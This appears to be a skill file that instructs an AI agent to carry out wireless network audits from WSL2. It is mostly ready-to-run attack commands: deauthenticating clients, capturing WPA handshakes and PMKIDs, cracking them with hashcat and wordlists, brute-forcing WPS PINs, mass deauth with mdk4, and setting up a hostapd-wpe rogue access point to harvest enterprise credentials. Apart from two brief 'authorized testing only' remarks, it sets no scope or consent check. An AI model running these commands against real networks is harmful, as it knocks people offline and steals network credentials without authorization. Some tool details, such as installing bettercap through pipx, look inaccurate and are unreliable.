---
name: wireless-audit
description: "Wireless network auditing: WPA/WPA2 assessment, handshake capture, PMKID attack, WPS testing, deauthentication, and wireless reconnaissance. Note: WSL2 cannot use internal WiFi in monitor mode — requires external USB adapter passed via USB/IP."
---

# Wireless Audit Skill

You are performing a **wireless network audit** — assessing the security of Wi-Fi networks. Operating on WSL2, you need an **external USB Wi-Fi adapter** passed through via `usbipd-win` for monitor mode. Internal Wi-Fi adapters belong to Windows and cannot be used in monitor mode from WSL2.

## WSL2 Wireless Limitations

### Critical Constraints
- **Internal WiFi adapter**: Belongs to Windows, cannot be used in monitor mode from WSL2.
- **External USB adapter required**: Must support monitor mode and packet injection (e.g., Alfa AWUS036ACH, Panda PAU05, TP-Link TL-WN722N v1).
- **USB/IP passthrough**: Use `usbipd-win` on Windows to bind and attach the USB Wi-Fi adapter to WSL2.

### USB/IP Setup
```powershell
# Windows PowerShell (Admin)
winget install usbipd  # or download from usbipd-win GitHub
usbipd wsl list        # list USB devices
usbipd bind --busid <BUSID>  # bind Wi-Fi adapter
usbipd attach --wsl --busid <BUSID>  # attach to WSL2
```

```bash
# Inside WSL2 — verify adapter is visible
lsusb
iwconfig
sudo ip link set wlan0 up
```

## Wireless Reconnaissance

### Monitor Mode Setup
```bash
# Check interface capabilities
iw list | grep -A 10 "Supported interface modes"
iw list | grep "Supported commands" -A 20 | grep "inject"

# Enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Or use airmon-ng (preferred)
sudo airmon-ng check kill  # kills interfering processes
sudo airmon-ng start wlan0  # creates wlan0mon
```

### Network Discovery
```bash
# Scan for access points and clients
sudo airodump-ng wlan0mon

# Targeted scan (BSSID-specific)
sudo airodump-ng -c $channel --bssid $bssid -w capture wlan0mon

# Probe request capture (see devices searching for known networks)
sudo airodump-ng wlan0mon --manufacturer --showack
```

## WPA/WPA2 Auditing

### WPA Handshake Capture
```bash
# 1. Start monitoring a specific network
sudo airodump-ng -c $channel --bssid $bssid -w capture wlan0mon

# 2. In another terminal, deauthenticate a client to force reconnection
sudo aireplay-ng -0 2 -a $bssid -c $client_mac wlan0mon

# 3. Handshake captured when client reconnects
# Look for "WPA handshake" in airodump output
# Capture file: capture-01.cap
```

### PMKID Attack (No Client Required)
```bash
# PMKID is in the first RSN IE of a beacon/probe response
# Works on WPA2-PSK with roaming features enabled
# Use hcxdumptool or bettercap for capture

# Capture PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=15

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 -E essidlist capture.pcapng

# Crack PMKID
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### WPA/WPA2 Cracking
```bash
# Convert capture to hashcat format
# .cap → .hc22000 (hashcat mode 22000)
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Crack with aircrack-ng (slower, CPU-only)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## WPS Auditing

```bash
# Check if WPS is enabled
sudo wash -i wlan0mon -C  # all channels

# Targeted WPS PIN attack (Pixie Dust — offline)
sudo reaver -i wlan0mon -b $bssid -K 1 -vv  # Pixie Dust attack

# Brute-force WPS PIN
sudo reaver -i wlan0mon -b $bssid -vv -L -N

# Bully — alternative WPS tool
sudo bully wlan0mon -b $bssid -vvv
```

## Deauthentication Attack (Testing Only)

```bash
# Deauth specific client (authorized testing only)
sudo aireplay-ng -0 1 -a $bssid -c $client_mac wlan0mon

# Broadcast deauth (all clients, use with caution)
sudo aireplay-ng -0 1 -a $bssid wlan0mon

# Targeted deauth with mdk4 (faster)
sudo mdk4 wlan0mon d -B $bssid -c $channel
```

## Enterprise Wi-Fi (WPA2-Enterprise) Auditing

```bash
# Capture 4-way handshake for enterprise network
# Need a client to authenticate

# RADIUS attack vector — create rogue AP with same SSID
# capture EAP hashes
sudo hostapd-wpe -c hostapd-wpe.conf

# Crack PEAP/MSCHAPv2 hashes
# asleap or john for EAP hashes
asleap -r capture.pcap -W /usr/share/wordlists/rockyou.txt
```

## Wireless Reconnaissance Tools

```bash
# Kismet — full wireless IDS/logger
sudo kismet -c wlan0mon

# Bettercap — WiFi module
sudo bettercap -eval "set wifi.interface wlan0mon; wifi.recon on"

# Wifite — automated wireless audit tool
sudo wifite -i wlan0mon --dict /usr/share/wordlists/rockyou.txt
```

## Bluetooth (Classic & LE) Auditing

```bash
# Check Bluetooth adapter availability
hciconfig
bluetoothctl list

# Basic discovery
sudo hcitool scan     # classic
sudo hcitool lescan   # BLE

# BlueZ — BLE GATT service enumeration
gatttool -b $mac -I
> connect
> characteristics
> read $handle

# Bettercap BLE module
sudo bettercap -eval "ble.recon on"
```

## Wireless Security Checklist
- [ ] Encryption: WEP → **WPA2/WPA3** (flag WEP immediately — it's broken)
- [ ] WPS: Enabled → risk of PIN brute-force
- [ ] PMKID: Capturable → offline cracking possible
- [ ] SSID broadcast: Disabled → security through obscurity (not real security)
- [ ] Guest network: Separated from internal network?
- [ ] Management frame protection: MFP/802.11w enabled?
- [ ] MAC filtering: Easily bypassed, not a security control
- [ ] Firmware: Access point firmware up to date?
- [ ] Default credentials: AP admin password changed from default?

## Tool Installation
```bash
# Wireless audit tools
sudo apt update && sudo apt install -y \
    aircrack-ng \
    reaver bully \
    mdk4 \
    hcxdumptool hcxtools \
    kismet \
    wireshark tshark \
    bluez bluez-tools \
    bluetooth

# Python tools via pipx
pipx install wifite bettercap

# hostapd-wpe (compile from source)
git clone https://github.com/sbrf-hostapd/hostapd-wpe.git ~/tools/hostapd-wpe

# Verify adapter is in monitor mode
iwconfig
```
